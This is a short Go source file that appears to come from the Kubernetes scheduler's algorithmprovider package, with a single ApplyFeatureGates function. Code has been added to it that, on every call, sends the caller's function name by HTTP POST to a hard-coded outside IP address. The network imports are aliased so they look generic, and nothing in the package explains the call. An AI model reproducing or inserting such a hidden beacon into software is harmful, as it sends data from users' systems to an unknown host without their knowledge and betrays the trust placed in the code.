package algorithmprovider

import (
 "k8s.io/kubernetes/pkg/scheduler/algorithmprovider/defaults"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
)

func ApplyFeatureGates() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defaults.ApplyFeatureGates()
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
